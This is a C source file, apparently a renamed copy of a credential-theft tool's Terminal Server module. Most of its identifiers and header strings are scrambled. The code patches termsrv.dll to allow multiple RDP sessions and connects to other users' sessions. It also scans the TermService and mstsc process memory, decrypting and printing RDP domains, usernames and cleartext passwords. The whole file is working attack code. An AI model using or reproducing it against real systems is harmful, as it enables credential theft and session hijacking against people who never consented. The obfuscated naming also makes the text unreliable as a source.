/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqlts.h"

const KUHL_M_C kcpdclqlc_ts[] = {
	{kcpdclqlts_multirdp,	L"multirdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
	{kcpdclqlts_sessions,	L"sessions",	NULL},
	{kcpdclqlts_remote,		L"remote",		NULL},
	{kcpdclqlts_logonpasswords, L"logonpasswords", L"[experimental] try to get passwords from running sessions"},
	{kcpdclqlts_mstsc, L"mstsc", L"[experimental] try to get passwords from mstsc process"},
};
const KUHL_M kcpdclqlts = {
	L"ts",	L"Terminal Server module", NULL,
	ARRAYSIZE(kcpdclqlc_ts), kcpdclqlc_ts, NULL, NULL
};

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_W10_1803_Query__CDefPolicy[] = {0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};
BYTE PTRN_W10_1809_Query__CDefPolicy[] = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_W10_1803_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};
BYTE PATC_W10_1809_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
#elif defined(_M_IX86)
BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};
BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x3b, 0x81, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90};
BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
#endif
BYTE PTRN_WIN5_TestLicence[]		= {0x83, 0xf8, 0x02, 0x7f};
BYTE PATC_WIN5_TestLicence[]		= {0x90, 0x90};
KULL_M_PATCH_GENERIC TermSrvMultiRdpReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_TestLicence),			PTRN_WIN5_TestLicence},			{sizeof(PATC_WIN5_TestLicence),			PATC_WIN5_TestLicence},			{3}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Query__CDefPolicy),	PTRN_WN60_Query__CDefPolicy},	{sizeof(PATC_WN60_Query__CDefPolicy),	PATC_WN60_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN6x_Query__CDefPolicy),	PTRN_WN6x_Query__CDefPolicy},	{sizeof(PATC_WN6x_Query__CDefPolicy),	PATC_WN6x_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_Query__CDefPolicy),	PTRN_WN81_Query__CDefPolicy},	{sizeof(PATC_WN81_Query__CDefPolicy),	PATC_WN81_Query__CDefPolicy},	{0}},
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1803_Query__CDefPolicy),	PTRN_W10_1803_Query__CDefPolicy},	{sizeof(PATC_W10_1803_Query__CDefPolicy),	PATC_W10_1803_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_Query__CDefPolicy),	PTRN_W10_1809_Query__CDefPolicy},	{sizeof(PATC_W10_1809_Query__CDefPolicy),	PATC_W10_1809_Query__CDefPolicy},	{0}},
#endif
};
NTSTATUS kcpdclqlts_multirdp(int argc, wchar_t * argv[])
{
	ydeuclqlpatch_genericProcessOrServiceFromBuild(TermSrvMultiRdpReferences, ARRAYSIZE(TermSrvMultiRdpReferences), L"TermService", L"teRMsrV.dll", TRUE);
	return STATUS_SUCCESS;
}

const PCWCHAR states[] = {L"Active", L"Connected", L"ConnectQuery", L"Shadow", L"Disconnected", L"Idle", L"Listen", L"Reset", L"Down", L"Init",};
NTSTATUS kcpdclqlts_sessions(int argc, wchar_t * argv[])
{
	LPCWSTR szServer = NULL;
	PSESSIONIDW sessions;
	WINSTATIONINFORMATION info;
	WINSTATIONREMOTEADDRESS addr;
	BOOL locked;
	DWORD i, count, cur, ret;
	BOOL isCur = ProcessIdToSessionId(GetCurrentProcessId(), &cur);
	HANDLE hServer = SERVERHANDLE_CURRENT;
	wchar_t ip[46];

	if(ydeuclqlstring_args_byName(argc, argv, L"server", &szServer, NULL))
	{
		isCur = FALSE;
		kprintf(L"Remote server: %s\n", szServer);
		hServer = WinStationOpenServerW((PWSTR) szServer);
		if(!hServer)
			PRINT_ERROR_AUTO(L"WinStationOpenServerW");
	}

	if(hServer || !szServer)
	{
		if(WinStationEnumerateW(hServer, &sessions, &count))
		{
			for(i = 0; i < count; i++)
			{
				kprintf(L"\nSession: %s%u - %s\n  state: %s (%u)\n", (isCur && (cur == sessions[i].SessionId)) ? L"*" : L"", sessions[i].SessionId, sessions[i].WinStationName, (sessions[i].State < ARRAYSIZE(states)) ? states[sessions[i].State] : L"?", sessions[i].State);
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationInformation, &info, sizeof(WINSTATIONINFORMATION), &ret))
				{
					kprintf(L"  user : %s @ %s\n", info.UserName, info.Domain);
					if(*(PULONGLONG) &info.ConnectTime)
					{
						kprintf(L"  Conn : ");
						ydeuclqlstring_displayLocalFileTime((PFILETIME) &info.ConnectTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.DisconnectTime)
					{
						kprintf(L"  disc : ");
						ydeuclqlstring_displayLocalFileTime((PFILETIME) &info.DisconnectTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.LogonTime)
					{
						kprintf(L"  logon: ");
						ydeuclqlstring_displayLocalFileTime((PFILETIME) &info.LogonTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.LastInputTime)
					{
						kprintf(L"  last : ");
						ydeuclqlstring_displayLocalFileTime((PFILETIME) &info.LastInputTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.CurrentTime)
					{
						kprintf(L"  curr : ");
						ydeuclqlstring_displayLocalFileTime((PFILETIME) &info.CurrentTime);
						kprintf(L"\n");
					}
				}
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationLockedState, &locked, sizeof(BOOL), &ret))
					kprintf(L"  lock : %s\n", locked ? L"yes" : L"no");
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationRemoteAddress, &addr, sizeof(WINSTATIONREMOTEADDRESS), &ret))
				{
					if(addr.sin_family == AF_INET)
					{
						if(RtlIpv4AddressToStringW((const IN_ADDR *) &addr.ipv4.in_addr, ip))
							kprintf(L"  addr4: %s\n", ip);
					}
					else if(addr.sin_family == 23) // AF_INET6
					{
						if(RtlIpv6AddressToStringW((const PVOID) &addr.ipv6.sin6_addr, ip))
							kprintf(L"  addr6: %s\n", ip);
					}
				}
			}
			if(!count)
				PRINT_ERROR(L"WinStationEnumerateW gave 0 result (maybe access problem?)\n");
			WinStationFreeMemory(sessions);
		}
		else PRINT_ERROR_AUTO(L"WinStationEnumerateW");
	}
	else PRINT_ERROR(L"No server HANDLE\n");
	if(hServer)
		WinStationCloseServer(hServer);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlts_remote(int argc, wchar_t * argv[])
{
	LPCWSTR szId, szPassword;
	DWORD id, target;
	if(ydeuclqlstring_args_byName(argc, argv, L"id", &szId, NULL))
	{
		id = wcstoul(szId, NULL, 0);
		if(ydeuclqlstring_args_byName(argc, argv, L"target", &szId, NULL))
			target = wcstoul(szId, NULL, 0);
		else target = LOGONID_CURRENT;
		
		ydeuclqlstring_args_byName(argc, argv, L"password", &szPassword, L"");

		kprintf(L"Asking to connect from %u to ", id);
		if(target == LOGONID_CURRENT)
			kprintf(L"current session");
		else kprintf(L"%u", target);
		
		kprintf(L"\n\n> ");
		if(WinStationConnectW(SERVERHANDLE_CURRENT, id, target, (LPWSTR) szPassword, FALSE))
			kprintf(L"Connected to %u\n", id);
		else if(GetLastError() == ERROR_LOGON_FAILURE)
			PRINT_ERROR(L"Bad password for this session (take care to not lock the account!)\n");
		else PRINT_ERROR_AUTO(L"WinStationConnect");
	}
	else PRINT_ERROR(L"Argument id is needed\n");
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlts_logonpasswords(int argc, wchar_t * argv[])
{
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	HANDLE hProcess;
	PKULL_M_MEMORY_HANDLE hMemory;

	if(ydeuclqlservice_getUniqueForName(L"TermService", &ServiceStatusProcess))
	{
		if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
		{
			if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, ServiceStatusProcess.dwProcessId))
			{
				if(ydeuclqlmemory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
				{
					kprintf(L"!!! Warning: false positives can be listed !!!\n");
					ydeuclqlprocess_getMemoryInformations(hMemory, kcpdclqlts_logonpasswords_MemoryAnalysis, hMemory);
					ydeuclqlmemory_close(hMemory);
				}
			}
			else PRINT_ERROR_AUTO(L"OpenProcess");
		}
		else PRINT_ERROR(L"Service is not running\n");
	}
	else PRINT_ERROR_AUTO(L"ydeuclqlservice_getUniqueForName");
	return STATUS_SUCCESS;
}

const BYTE MyPattern[] = {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47, /*0x0b, 0x00*/};
const BYTE MyPattern2[] = {0x00, 0x00, 0x00, 0x00, 0xf3, 0x47, /*0x0b, 0x00*/};
const BYTE MyPattern3[] = {0x00, 0x00, 0x00, 0x00, 0x3b, 0x01};
BOOL CALLBACK kcpdclqlts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pMemoryBasicInformation->BaseAddress, (PKULL_M_MEMORY_HANDLE) pvArg};
	PBYTE CurrentPtr, limite;
	PWTS_JoAA pceFdData;
	BOOL decStatus = TRUE, bIsCandidate;

	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
	{
		aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize);
		if(aLocalBuffer.address)
		{
			if(ydeuclqlmemory_copy(&aLocalBuffer, &aProcess, pMemoryBasicInformation->RegionSize))
			{
				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(MyPattern) <= limite; CurrentPtr++)
				{
					pceFdData = (PWTS_JoAA) CurrentPtr;

					if(RtlEqualMemory(MyPattern, CurrentPtr, sizeof(MyPattern)) || RtlEqualMemory(MyPattern2, CurrentPtr, sizeof(MyPattern2)))
					{
						bIsCandidate = ((pceFdData->unk1 & 0xff010000) == 0x00010000); // mstscax & freerdp
					}
					else if (RtlEqualMemory(MyPattern3, CurrentPtr, sizeof(MyPattern3)))
					{
						bIsCandidate = !(pceFdData->unk1 & 0xffff0000); // rdesktop
					}
					else bIsCandidate = FALSE;
					
					if(bIsCandidate && !pceFdData->unk2)
					{
						//kprintf(L"-> %08x (%hu %hu %hu)\n", pceFdData->unk1, pceFdData->cbDomain, pceFdData->cbUsername, pceFdData->cbPassword);
						if(!(pceFdData->cbDomain & 1) && (pceFdData->cbDomain < sizeof(pceFdData->Domain)))
						{
							if(!(pceFdData->cbUsername & 1) && (pceFdData->cbUsername > sizeof(wchar_t)) && (pceFdData->cbUsername < sizeof(pceFdData->UserName)))
							{
								if(!(pceFdData->cbPassword & 1) && (pceFdData->cbPassword < sizeof(pceFdData->Password)))
								{
									kprintf(
										L"\n   Domain      : %.*s\n"
										L"   UserName    : %.*s\n",
										pceFdData->cbDomain / sizeof(wchar_t), pceFdData->Domain,
										pceFdData->cbUsername/ sizeof(wchar_t), pceFdData->UserName
										);

									if(pceFdData->cbPassword && (AHFIEEIO_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
									{
										decStatus = ydeuclqlcrypto_remote_CryptUnprotectMemory(aProcess.hMemory, pceFdData->Password, sizeof(pceFdData->Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
									}

									if(decStatus)
									{
										kprintf(L"   Password/Pin: %.*s\n", pceFdData->cbPassword / sizeof(wchar_t), pceFdData->Password);
									}
								}
							}
						}
					}
				}
			}
			LocalFree(aLocalBuffer.address);
		}
	}
	return TRUE;
}

NTSTATUS kcpdclqlts_mstsc(int argc, wchar_t * argv[])
{
	KUHL_M_TS_MSTSC_ARG myArgs;

	myArgs.bIsVerbose = ydeuclqlstring_args_byName(argc, argv, L"verbose", NULL, NULL);
	kprintf(L"!!! Warning: false positives can be listed !!!\n");
	ydeuclqlprocess_getProcessInformation(kcpdclqlts_mstsc_enumProcess, &myArgs);
	
	return STATUS_SUCCESS;
}

BOOL CALLBACK kcpdclqlts_mstsc_enumProcess(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	HANDLE hProcess;
	DWORD dwPid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
	PKUHL_M_TS_MSTSC_ARG pmyArgs;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION information;
#if defined(_M_X64)
	BOOL bIsWow64;
#endif

	hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, dwPid);
	if(hProcess)
	{
#if defined(_M_X64)
		if(IsWow64Process(hProcess, &bIsWow64) && !bIsWow64)
		{
#endif
			pmyArgs = (PKUHL_M_TS_MSTSC_ARG) pvArg;
			if(ydeuclqlmemory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &pmyArgs->hMemory))
			{
				if(ydeuclqlprocess_getVeryBasicModuleInformationsForName(pmyArgs->hMemory, L"mstscax.dll", &information))
				{
					kprintf(L"\n| PID %u\t%wZ (module @ 0x%p)\n", dwPid, &pSystemProcessInformation->ImageName, information.DllBase);
					ydeuclqlprocess_getMemoryInformations(pmyArgs->hMemory, kcpdclqlts_mstsc_MemoryAnalysis, pvArg);
				}
				ydeuclqlmemory_close(pmyArgs->hMemory);
			}
#if defined(_M_X64)
		}
#endif
		CloseHandle(hProcess);
	}

	return TRUE;
}

BOOL CALLBACK kcpdclqlts_mstsc_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	PKUHL_M_TS_MSTSC_ARG pmyArgs = (PKUHL_M_TS_MSTSC_ARG) pvArg;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pMemoryBasicInformation->BaseAddress, pmyArgs->hMemory};
	PBYTE CurrentPtr, limite;
	BOOL decStatus = TRUE;
	PTS_PROPERTIES_JoAA pProperties;

	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
	{
		aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize);
		if(aLocalBuffer.address)
		{
			if(ydeuclqlmemory_copy(&aLocalBuffer, &aProcess, pMemoryBasicInformation->RegionSize))
			{
				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(ULONGLONG) <= limite; CurrentPtr++)
				{
					if(*((PULONGLONG) CurrentPtr) == 0x3dbcaabcd)
					{
						pProperties = (PTS_PROPERTIES_JoAA) (CurrentPtr - FIELD_OFFSET(TS_PROPERTIES_JoAA, unkh0));

						if((pProperties->unkd1 >= 10) && (pProperties->unkd1 < 500))
						{
							if((pProperties->cbProperties >= 10) && (pProperties->cbProperties < 500))
							{
								if(pProperties->pProperties)
								{
									if(pmyArgs->bIsVerbose)
									{
										kprintf(L"| %p - %p - 0x%08x - %u - %p - %u - %p - %p - %u\n", pProperties->unkp0, pProperties->unkp1, pProperties->unkh0, pProperties->unkd0, pProperties->unkp2, pProperties->unkd1, pProperties->unkp3, pProperties->pProperties, pProperties->cbProperties);
									}
									kcpdclqlts_mstsc_MemoryAnalysis_property(aProcess.hMemory, pProperties->pProperties, pProperties->cbProperties, pmyArgs->bIsVerbose);
								}
							}
						}
					}
				}
			}
			LocalFree(aLocalBuffer.address);
		}
	}
	return TRUE;
}

void kcpdclqlts_mstsc_MemoryAnalysis_property(PKULL_M_MEMORY_HANDLE hMemory, PVOID pvProperties, DWORD cbProperties, BOOL bIsVerbose)
{
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pvProperties, hMemory}, aDataBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	PTS_PROPERTY_JoAA pProperties;
	BOOL bToDisplay, bIsAlreadyPrinted = FALSE;
	DWORD i;
	PSTR szPropertyName;
	PWSTR szPropertyValue;
	
	aLocalBuffer.address = LocalAlloc(LPTR, cbProperties * sizeof(TS_PROPERTY_JoAA));
	if(aLocalBuffer.address)
	{
		if(ydeuclqlmemory_copy(&aLocalBuffer, &aProcess, cbProperties * sizeof(TS_PROPERTY_JoAA)))
		{
			pProperties = (PTS_PROPERTY_JoAA) aLocalBuffer.address;

			for(i = 0; i < cbProperties; i++)
			{
				if(pProperties[i].szProperty && (pProperties[i].dwType > 0) && (pProperties[i].dwType < 20))
				{
					aProcess.address = (LPVOID) pProperties[i].szProperty;
					szPropertyName = ydeuclqlprocess_getImportNameWithoutEnd(&aProcess);
					if(szPropertyName)
					{
						if(	bIsVerbose ||
							!_strcmpi("ServerName", szPropertyName) ||
							!_strcmpi("ServerFqdn", szPropertyName) ||
							!_strcmpi("ServerNameUsedForAuthentication", szPropertyName) ||
							!_strcmpi("UserSpecifiedServerName", szPropertyName) ||
							!_strcmpi("UserName", szPropertyName) ||
							!_strcmpi("Domain", szPropertyName) ||
							!_strcmpi("Password", szPropertyName) || 
							!_strcmpi("SmartCardReaderName", szPropertyName) ||
							!_strcmpi("RDmiUsername", szPropertyName) ||
							!_strcmpi("PasswordContainsSCardPin", szPropertyName)
							)
						{
							bToDisplay = TRUE;
						}
						else bToDisplay = FALSE;

						if(bToDisplay)
						{
							if(!bIsAlreadyPrinted)
							{
								kprintf(L"\n");
								bIsAlreadyPrinted = TRUE;
							}

							kprintf(L"%-40S  ", szPropertyName);

							switch(pProperties[i].dwType)
							{
							case 1:
								kprintf(L"[ dword ] %u (0x%08x)", (DWORD) pProperties[i].pvData, (DWORD) pProperties[i].pvData);
								break;

							case 2:
								kprintf(L"[ word? ] %u (0x%04x)", (WORD) pProperties[i].pvData, (WORD) pProperties[i].pvData);
								break;

							case 3:
								kprintf(L"[ bool  ] %s", ((BOOL) pProperties[i].pvData) ? L"TRUE" : L"FALSE");
								break;

							case 4:
								kprintf(L"[wstring] ");
								aProcess.address = pProperties[i].pvData;
								szPropertyValue = ydeuclqlprocess_get_wstring_without_end(&aProcess, 1024);
								if(szPropertyValue)
								{
									kprintf(L"\'%s\'", szPropertyValue);
									LocalFree(szPropertyValue);
								}
								break;

							case 6:
								kprintf(L"[protect] ");
								if(pProperties[i].pvData && (DWORD) pProperties[i].unkp2)
								{
									aDataBuffer.address = (PBYTE) LocalAlloc(LPTR, (DWORD) pProperties[i].unkp2);

									if(aDataBuffer.address)
									{
										aProcess.address = pProperties[i].pvData;
										if(ydeuclqlmemory_copy(&aDataBuffer, &aProcess, (DWORD) pProperties[i].unkp2))
										{
											if(pProperties[i].dwFlags & 0x800)
											{
												if(ydeuclqlcrypto_remote_CryptUnprotectMemory(aProcess.hMemory, aDataBuffer.address, (DWORD) pProperties[i].unkp2, CRYPTPROTECTMEMORY_SAME_PROCESS))
												{
													kprintf(L"\'%.*s\'", *(PDWORD) aDataBuffer.address / sizeof(wchar_t), ((PBYTE) aDataBuffer.address) + sizeof(DWORD));
												}
												else PRINT_ERROR(L"CryptUnprotectMemory");
											}
											else
											{
												ydeuclqlstring_wprintf_hex(aDataBuffer.address, (DWORD) pProperties[i].unkp2, 0);
											}
										}
										LocalFree(aDataBuffer.address);
									}
								}
								break;

							case 7: // ip, blob ?
							default:
								kprintf(L"[unk - %u] 0x%p", pProperties[i].dwType, pProperties[i].pvData);
								break;
							}

							//kprintf(L" (0x%08x)\n", pProperties[i].dwFlags);
							kprintf(L"\n");
						}

						LocalFree(szPropertyName);
					}
					else break;
				}
				else break;
			}
		}
		LocalFree(aLocalBuffer.address);
	}
}